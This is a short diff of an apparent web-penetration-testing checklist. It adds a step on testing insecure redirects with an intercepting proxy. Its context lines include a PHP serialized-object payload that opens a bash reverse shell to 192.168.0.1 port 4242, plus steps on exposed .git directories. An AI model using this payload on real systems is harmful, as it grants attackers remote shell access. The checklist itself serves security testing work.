@@ -21,6 +21,10 @@ https://notsosecure.com/remote-code-execution-via-php-unserialize/
 + serialize as necessary as a parameter
 public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/192.168.0.1/4242 0>&1\'"); ?>';
 ```
++ <b>Check for insecure redirects</b>
+Open up ZAP/Burpsuite, capture the 302 response, change the status code from 302 to 200 and change the location field.
+![image](https://user-images.githubusercontent.com/34889665/120560621-02f31b80-c3d1-11eb-98b4-a8cbf9d831b2.png)
+
 + <b>Check for exposed /.git directory</b>
 Clone repository:
 ```
